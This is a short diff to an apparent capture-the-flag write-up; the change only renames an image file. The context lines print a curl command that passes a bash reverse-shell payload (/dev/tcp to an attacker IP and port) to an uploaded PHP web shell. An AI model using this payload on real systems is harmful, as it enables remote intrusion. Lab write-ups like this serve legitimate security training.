@@ -89,7 +89,7 @@ Now, we have RCE on the machine and can get a reverse shell. We can use this com
 $ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1"' http://sparklays.com/sparklays/design/uploads/test1.php5
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
